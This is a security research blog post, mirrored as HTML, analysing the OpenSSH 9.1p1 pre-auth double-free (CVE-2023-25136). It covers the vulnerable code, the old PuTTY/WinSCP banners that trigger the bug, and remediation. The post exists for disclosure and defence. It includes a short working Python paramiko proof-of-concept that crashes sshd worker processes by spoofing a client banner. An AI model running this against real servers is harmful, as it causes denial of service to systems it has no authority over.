<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://jfrog.com/blog/openssh-pre-auth-double-free-cve-2023-25136-writeup-and-proof-of-concept/">Original</a>
    <h1>OpenSSH Pre-Auth Double Free – CVE-2023-25136 – Writeup and Proof-of-Concept</h1>
    
    <div id="readability-page-1" class="page"><div>
			<p><img src="https://media.jfrog.com/wp-content/uploads/2023/02/08165525/CVE-2023-25136-Writeup-and-PoC-863x300_1.png" alt="OpenSSH Pre-Auth Double Free CVE-2023-25136 Writeup and PoC" width="863" height="300"/></p>
<p>OpenSSH’s newly released version <a href="https://www.openssh.com/txt/release-9.2" target="_blank" rel="noopener">9.2p1</a> contains a fix for a <a href="https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory" target="_blank" rel="noopener">double-free</a> vulnerability.</p>
<p>Given the severe potential impact of the vulnerability on OpenSSH servers (DoS/RCE) and its high popularity in the industry, this security fix prompted the JFrog Security Research team to investigate the vulnerability.</p>
<p>This blog post provides details on the vulnerability, who is affected, and a proof-of-concept to trigger it causing a Denial of Service (DoS).</p>
<h2>What is OpenSSH?</h2>
<p><a href="https://www.openssh.com" target="_blank" rel="noopener">OpenSSH</a> is a popular tool used for secure communication and remote access. It was developed as a free, open-source implementation of the Secure Shell (SSH) communications protocol and is widely used for various applications.</p>
<p>OpenSSH provides a secure and encrypted connection between two untrusted hosts over an insecure network, making it an essential tool for remote access and secure file transfer.</p>
<p>With the increasing use of cloud computing and remote access to servers, OpenSSH has become a crucial tool for system administrators and developers who need to access and manage remote systems securely.</p>
<p>OpenSSH also supports a wide range of platforms including Linux, macOS, and Windows, making it a widely adopted tool across different operating systems. With its ease of use and strong security features, OpenSSH has become an industry-standard tool for secure remote access.</p>
<h2>Vulnerability Background</h2>
<p>On February 2, 2023, OpenSSH released version 9.2p1 with this <a href="https://www.openssh.com/txt/release-9.2" target="_blank" rel="noopener">security advisory</a>. <span>It immediately became clear this version is of interest because of the pre-auth double-free vulnerability. Searching the OpenSSH’s GitHub repository, this is the </span><a href="https://github.com/openssh/openssh-portable/commit/12da7823336434a403f25c7cc0c2c6aed0737a35" target="_blank" rel="noopener"><span>fix commit</span></a><span>.</span></p>
<p>The commit message indicates <code>bz3522</code>, which refers to the <code>Bugzilla</code> <a href="https://bugzilla.mindrot.org/show_bug.cgi?id=3522" target="_blank" rel="noopener"><span>issue</span></a><span> reported by the user Mantas Mikulėnas.</span></p>
<p>In its report, Mantas mentions using PuTTY obsolete version 0.64, also attaching a back-trace of the double-free abort.</p>
<h2>Research Walkthrough</h2>
<p>To dive deeper, we set up an environment with the vulnerable OpenSSH 9.1p1 and pulled a copy of the old PuTTY 0.64 version, released 8 years ago on February 28, 2015.</p>
<p>The following error was returned after trying to connect with PuTTY 0.64 to the vulnerable OpenSSH server:</p>
<p><img loading="lazy" src="https://media.jfrog.com/wp-content/uploads/2023/02/08171707/1_PuTTY-0.64-Fatal-Error.png" alt="PuTTY 0.64 Fatal Error" width="406" height="190"/></p>
<p>Since the obsolete client’s key exchange algorithms are not supported by the new OpenSSH version, we edited the sshd_config file by adding the following line to the <code>/etc/ssh/sshd_config</code>:</p>
<p><code>KexAlgorithms +diffie-hellman-group1-sha1</code></p>
<p>After restarting the SSH server and trying again, the following error was returned:</p>
<p><img loading="lazy" src="https://media.jfrog.com/wp-content/uploads/2023/02/08171733/2_PuTTY-Fatal-Error.png" alt="PuTTY Fatal Error" width="406" height="147"/></p>
<p>After adding another configuration line to the sshd_config, we were able to connect to the vulnerable OpenSSH server and reproduce the crash:</p>
<p><code>HostKeyAlgorithms +ssh-rsa</code></p>
<p>Running the server in debug mode (using the <code>-ddd</code> flag), the following debug message was returned:</p>
<p><code>ssh_sandbox_violation: unexpected system call (arch:0xc000003e,syscall:20 @ 0x7fd7473fb771) [preauth]</code></p>
<p>The Syscall number 20 is <code>writev()</code> which matches the <code>Bugzilla</code> report.</p>
<p>Note that the configuration changes we’ve made were only to reproduce the vulnerability through PuTTY and are not required to exploit it. As we’ll see in the PoC, the default configuration is vulnerable.</p>
<h2>Vulnerability In-Depth Details</h2>
<p>We started by examining the fix commit stating that <code>compat_kex_proposal()</code> is responsible for the double-free. When the connection compatibility option <code>SSH_OLD_DHGEX</code> is true on [1], the second argument <code>p</code> is assigned to <code>cp</code> on [2] and later freed on [3].</p>
<pre><code>/* Always returns pointer to allocated memory, caller must free. */
char *
compat_kex_proposal(struct ssh *ssh, char *p)
{
    char *cp = NULL;


    if ((ssh-&gt;compat &amp; (SSH_BUG_CURVE25519PAD|SSH_OLD_DHGEX)) == 0)
        return xstrdup(p);
    debug2_f(&#34;original KEX proposal: %s&#34;, p);
    if ((ssh-&gt;compat &amp; SSH_BUG_CURVE25519PAD) != 0)
        if ((p = match_filter_denylist(p,
            &#34;curve25519-sha256@libssh.org&#34;)) == NULL)
            fatal(&#34;match_filter_denylist failed&#34;);
    if ((ssh-&gt;compat &amp; SSH_OLD_DHGEX) != 0) {               [1]
        cp = p;                                             [2]
        if ((p = match_filter_denylist(p,
            &#34;diffie-hellman-group-exchange-sha256,&#34;
            &#34;diffie-hellman-group-exchange-sha1&#34;)) == NULL)
            fatal(&#34;match_filter_denylist failed&#34;);
        free(cp);                                           [3]
    }
    debug2_f(&#34;compat KEX proposal: %s&#34;, p);
    if (*p == &#39;\0&#39;)
        fatal(&#34;No supported key exchange algorithms found&#34;);
    return p;
}</code></pre>
<p>The call to <code>compat_kex_proposal()</code> is inside the <code>do_ssh2_kex()</code> function:</p>
<pre><code>    myproposal[PROPOSAL_KEX_ALGS] = prop_kex = compat_kex_proposal(ssh,
        options.kex_algorithms);</code></pre>
<p>The freed <code>cp=p</code> from <code>compat_kex_proposal()</code> refers to the <code>options.kex_algorithms</code> argument.</p>
<p>Searching for <code>kex_algorithms</code> in the source code, we encountered the <code>assemble_algorithms</code> from the crash in the Bugzilla report:</p>
<pre><code>ASSEMBLE(kex_algorithms, def_kex, all_kex);</code></pre>
<p><code>ASSEMBLE</code> is a macro for calling the <code>kex_assemble_names()</code> function:</p>
<pre><code>#define ASSEMBLE(what, defaults, all) \
    do { \
        if ((r = kex_assemble_names(&amp;o-&gt;what, defaults, all)) != 0) \
            fatal_fr(r, &#34;%s&#34;, #what); \
    } while (0)</code></pre>
<p>The <code>kex_assemble_names()</code> function is called with the address of <code>o-&gt;kex_algorithms</code> as its first argument (which is <code>listp</code>). This is where the second free occurs.</p>
<pre><code>int
kex_assemble_names(char **listp, const char *def, const char *all)</code></pre>
<p>Due to the <code>options.kex_algorithms</code> handle being freed and becoming a dangling pointer, it’s once again freed causing a double-free.</p>
<p>But where is the <code>SSH_OLD_DHGEX</code> option set?</p>
<p>Inside the <code>compat_banner()</code> function, which determines bug flags from the SSH protocol banner. A struct named <code>check[]</code> lists all the SSH client IDs and their flags. The following snippet shows the Client IDs that are assigned the <code>SSH_OLD_DHGEX</code> option. We can also see that WinSCP might also be able to trigger this behavior.</p>
<pre><code>        { &#34;PuTTY_Local:*,&#34;  /* dev versions &lt; Sep 2014 */ &#34;PuTTY-Release-0.5*,&#34; /* 0.50-0.57, DH-GEX in &gt;=0.52 */
          &#34;PuTTY_Release_0.5*,&#34; /* 0.58-0.59 */
          &#34;PuTTY_Release_0.60*,&#34;
          &#34;PuTTY_Release_0.61*,&#34;
          &#34;PuTTY_Release_0.62*,&#34;
          &#34;PuTTY_Release_0.63*,&#34;
          &#34;PuTTY_Release_0.64*&#34;,
                    SSH_OLD_DHGEX },
        { &#34;FuTTY*&#34;,     SSH_OLD_DHGEX }, /* Putty Fork */
        { &#34;WinSCP_release_4*,&#34;
          &#34;WinSCP_release_5.0*,&#34;
          &#34;WinSCP_release_5.1,&#34;
          &#34;WinSCP_release_5.1.*,&#34;
          &#34;WinSCP_release_5.5,&#34;
          &#34;WinSCP_release_5.5.*,&#34;
          &#34;WinSCP_release_5.6,&#34;
          &#34;WinSCP_release_5.6.*,&#34;
          &#34;WinSCP_release_5.7,&#34;
          &#34;WinSCP_release_5.7.1,&#34;
          &#34;WinSCP_release_5.7.2,&#34;
          &#34;WinSCP_release_5.7.3,&#34;
          &#34;WinSCP_release_5.7.4&#34;,
                    SSH_OLD_DHGEX },</code></pre>
<h2>Proof-of-Concept</h2>
<p>We opted to create a Python Denial of service Proof-of-Concept because of its flexibility and portability. The proof-of-concept triggers the double-free using the <code>paramiko</code> package and causes an abort crash.</p>
<p><code>paramiko</code> is a widespread Python SSH implementation, providing both server and client functionality. For the PoC we changed the connecting client version banner to reflect an obsolete client like <code>PuTTY v0.64</code>.</p>
<p>Available in <a href="https://github.com/jfrog/jfrog-CVE-2023-25136-OpenSSH_Double-Free" target="_blank" rel="noopener">our GitHub repository</a>.</p>
<pre><code>import paramiko


VICTIM_IP = &#34;127.0.1&#34;
CLIENT_ID = &#34;PuTTY_Release_0.64&#34;


def main():
    transport = paramiko.Transport(VICTIM_IP)
    transport.local_version = f&#34;SSH-2.0-{CLIENT_ID}&#34;
    transport.connect(username=&#39;&#39;, password=&#39;&#39;)


if __name__ == &#34;__main__&#34;:
    main()</code></pre>
<h2>Vulnerability Impact</h2>
<p>The OpenSSH Daemon listens for connections from clients. It forks a new daemon for each incoming connection. The forked daemons handle key exchange, encryption, authentication, command execution, and data exchange.</p>
<p>The vulnerability is a double-free that can theoretically be exploited for a denial of service, as demonstrated by our Proof-of-Concept. Note that only the forked daemons crash, because of a sandbox violation while trying to call <code>writev()</code>, so it leaves the main server daemon free to handle new clients.</p>
<p>OpenSSH has put security measures in place such as a sandbox and Privilege Separation mechanism.</p>
<p>Though remote code execution is theoretically possible, it would require deep-dive research for finding allocation primitives, and even then- will be less impactful because of its security measures.</p>
<p>The JFrog Security Research team gave this vulnerability a <strong>Medium</strong> severity rating for the following reasons:</p>
<ul>
<li>No prerequisites are required. A default configuration is vulnerable.</li>
<li>A DoS attack that crashes a forked worker process is much less severe than a DoS that crashes an important daemon, but they will both receive a “High” Availability impact CVSS rating.</li>
<li>OpenSSH has put security measures in place such as a sandbox and Privilege Separation mechanism.</li>
</ul>
<h2>Vulnerability Targets</h2>
<p>The vulnerability applies only to OpenSSH version 9.1p1 with a default configuration, meaning no prerequisites are required.</p>
<h2>Remediation</h2>
<p>It’s strongly recommended to upgrade OpenSSH to the latest version 9.2p1.</p>
<p>However, it should be noted again that this vulnerability requires high complexity to leverage for remote code execution due to OpenSSH’s security measures (e.g. sandboxing).</p>
<h3>Is the JFrog Platform Vulnerable to the Vulnerability?</h3>
<p>After conducting internal research, we can confirm that the <a href="https://jfrog.com/platform/">JFrog DevOps platform</a> is not vulnerable to OpenSSH’s CVE-2023-25136.</p>
<h3>Stay up-to-date with JFrog Security Research</h3>
<p><span>The security research team’s findings and research play an important role in improving the JFrog Platform’s application software security capabilities. This manifests in the form of enhanced CVE metadata and remediation advice for developers, DevOps and security teams in the <a href="http://www.jfrog.com/xray">JFrog Xray</a> vulnerability database. And also as new security scanning capabilities used by JFrog Xray.</span></p>
<p>Follow the latest discoveries and technical updates from the JFrog Security Research team in our <a href="http://research.jfrog.com">research website</a>,<a href="https://jfrog.com/blog/tag/security-research/"> security research blog posts</a> and on Twitter at<a href="https://twitter.com/JFrogSecurity"> @JFrogSecurity</a>.</p>
        </div></div>
  </body>
</html>
